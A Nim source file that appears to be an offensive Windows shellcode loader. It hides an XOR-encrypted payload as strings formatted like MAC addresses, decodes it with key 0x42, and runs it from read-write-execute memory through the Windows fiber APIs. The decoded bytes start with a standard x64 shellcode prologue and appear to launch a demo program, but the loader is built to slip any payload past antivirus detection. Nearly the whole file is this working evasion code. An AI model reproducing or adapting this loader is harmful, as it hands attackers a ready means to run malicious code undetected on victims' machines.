#[
    Author: jmfl 

inspired by HopScotch, Twitter: @0xHop
   
]#

import winim/lean
import osproc
import strutils

proc parseHex(hexStr: string): int =
    var result = 0
    for c in hexStr:
        result = result * 16 + (if c in {'0'..'9'}: ord(c) - ord('0')
                                elif c in {'a'..'f'}: ord(c) - ord('a') + 10
                                elif c in {'A'..'F'}: ord(c) - ord('A') + 10
                                else: 0)
    return result

proc macToBytes(mac: string): seq[byte] =
    var bytes: seq[byte]
    let parts = mac.split("-")
    for part in parts:
        let byteValue = parseHex(part)
        bytes.add(byteValue.byte)
    return bytes

proc xorDecrypt(key: byte, encryptedShellcode: seq[byte]): seq[byte] =
    var decrypted: seq[byte]
    for b in encryptedShellcode:
        decrypted.add(b xor key)
    return decrypted

proc RunFiber(shellcode: seq[byte]): void =
    let MasterFiber = ConvertThreadToFiber(NULL)
    let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    WriteProcessMemory(pHandle, vAlloc, unsafeaddr shellcode[0], cast[SIZE_T](shellcode.len), addr bytesWritten)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
    SwitchToFiber(xFiber)

when defined(windows):

    const encryptedMAC: seq[string] = @[
        "BE-0A-C1-A6-B2-AA",
    "82-42-42-42-03-13",
    "03-12-10-13-14-0A",
    "73-90-27-0A-C9-10",
    "22-0A-C9-10-5A-0A",
    "C9-10-62-0A-C9-30",
    "12-0A-4D-F5-08-08",
    "0F-73-8B-0A-73-82",
    "EE-7E-23-3E-40-6E",
    "62-03-83-8B-4F-03",
    "43-83-A0-AF-10-03",
    "13-0A-C9-10-62-C9",
    "00-7E-0A-43-92-C9",
    "C2-CA-42-42-42-0A",
    "C7-82-36-25-0A-43",
    "92-12-C9-0A-5A-06",
    "C9-02-62-0B-43-92",
    "A1-14-0A-BD-8B-03",
    "C9-76-CA-0A-43-94",
    "0F-73-8B-0A-73-82",
    "EE-03-83-8B-4F-03",
    "43-83-7A-A2-37-B3",
    "0E-41-0E-66-4A-07",
    "7B-93-37-9A-1A-06",
    "C9-02-66-0B-43-92",
    "24-03-C9-4E-0A-06",
    "C9-02-5E-0B-43-92",
    "03-C9-46-CA-0A-43",
    "92-03-1A-03-1A-1C",
    "1B-18-03-1A-03-1B",
    "03-18-0A-C1-AE-62",
    "03-10-BD-A2-1A-03",
    "1B-18-0A-C9-50-AB",
    "15-BD-BD-BD-1F-0A",
    "F8-43-42-42-42-42",
    "42-42-42-0A-CF-CF",
    "43-43-42-42-03-F8",
    "73-C9-2D-C5-BD-97",
    "F9-B2-F7-E0-14-03",
    "F8-E4-D7-FF-DF-BD",
    "97-0A-C1-86-6A-7E",
    "44-3E-48-C2-B9-A2",
    "37-47-F9-05-51-30",
    "2D-28-42-1B-03-CB",
    "98-BD-97-21-23-2E",
    "21-6C-27-3A-27-42"
    ]
    
    var encryptedShellcode: seq[byte]
    for mac in encryptedMAC:
        encryptedShellcode.add(macToBytes(mac))

    let key: byte = 0x42
    let decryptedShellcode = xorDecrypt(key, encryptedShellcode)

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        RunFiber(decryptedShellcode)
